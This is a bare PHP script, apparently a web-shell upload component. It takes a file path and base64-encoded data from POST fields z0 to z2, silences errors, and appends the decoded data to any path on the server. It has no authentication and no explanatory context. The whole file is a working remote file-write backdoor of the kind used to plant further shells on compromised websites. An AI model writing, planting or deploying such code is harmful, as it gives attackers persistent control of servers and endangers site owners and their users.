<?php
@ini_set('display_errors','0');
@set_time_limit(0);
$szFilePath = base64_decode($_POST['z0']);
$szChunkSize = base64_decode($_POST['z1']);
$szb64Data = base64_decode($_POST['z2']);
$c=str_replace("\r","",$szb64Data);
$c=str_replace("\n","",$c);
$buf=base64_decode($c);
echo(@fwrite(fopen($szFilePath, 'a'),$buf)?"1":"0");
?>